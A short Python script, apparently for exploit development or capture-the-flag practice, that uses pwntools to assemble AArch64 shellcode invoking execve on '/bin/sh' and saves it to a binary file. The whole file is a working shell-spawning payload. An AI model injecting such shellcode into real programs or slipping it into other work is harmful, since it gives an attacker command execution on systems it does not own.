from pwn import *

context.arch = 'aarch64'

shellcode = asm('''
    adr x0, binsh      // x0 = pointer to "/bin/sh"
    mov x1, 0          // argv = NULL
    mov x2, 0          // envp = NULL
    mov x8, 221        // syscall execve
    svc 0

binsh:
    .ascii "/bin/sh\\0"
''')

with open("execve_binsh.bin", "wb") as f:
    f.write(shellcode)
